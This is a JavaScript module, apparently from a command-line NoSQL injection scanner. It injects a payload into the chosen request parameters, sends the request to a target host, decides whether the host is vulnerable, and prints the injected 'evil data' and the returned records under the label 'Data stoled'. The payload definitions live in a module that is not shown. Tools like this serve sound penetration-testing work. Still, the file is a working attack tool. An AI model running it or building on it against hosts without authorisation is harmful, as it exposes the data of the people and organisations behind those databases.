const request = require('./request')
const nosqli = require('./nosqli')
const colors = require('colors')
const ora = require('ora')
const spinner = ora('')

module.exports = async ({ host, method, params, data, errorMessage, headers }) => {
    const request_data = {
        method: method.toLowerCase(),
        headers: set_headers(headers),
        url: host,
        params: params.split(','),
        data: JSON.parse(data)
    }

    let { preapared_data, payload } = nosqli.prepare_data(request_data)
    request_data.data = preapared_data

    spinner.start(`Request ${host}`)
    const response = await send_request(request_data)
    await success_message('Request finished', 1000)

    spinner.start(`Analyzing response`)
    const { vulnerable } = nosqli.analyze_response({ response, errorMessage })
    await success_message(`Response analyzed`, 1000)

    spinner.start('Generating report')
    if (vulnerable) {
        await success_message(`${host} is ` + `vulnerable\r\n`.red, 1000)
        spinner.info(`Payload: ${JSON.stringify(payload).rainbow}`)
        spinner.info(`Evil data 😈: ${gen_evil_data({ data, params, payload })}`)
        spinner.info(`Data stoled:`)
        return print_some_info(response)
    }

    await success_message(`${host} is ` + `safe`.green, 1000)
}

function gen_evil_data ({ data, params, payload }) {
    params = params.split(',')
    data = JSON.parse(data)

    for (const param of params) {
        data[param] = payload
    }

    data = JSON.stringify(data)

    return data
}

function set_headers (headers) {
    let temp_headers = { 'Content-Type': 'application/json' }

    if (headers) {
        let arrHeaders = headers.split(';')
    
        for (let h of arrHeaders) {
            let tmp_h = h.split(':')
            temp_headers[tmp_h[0]] = tmp_h[1]
        }
    
        return temp_headers
    }
}

async function send_request({ method, url, headers, data }) {
    const { body, response } = await request[method]({ url, headers, data })
    return body
}

function print_some_info (response) {
    console.log(JSON.stringify(response, null, 4))
}

async function success_message(text, timeout) {
    return new Promise((resolve) => {
        setTimeout(() => {
            spinner.succeed(text)
            return resolve(true)
        }, timeout)
    })
}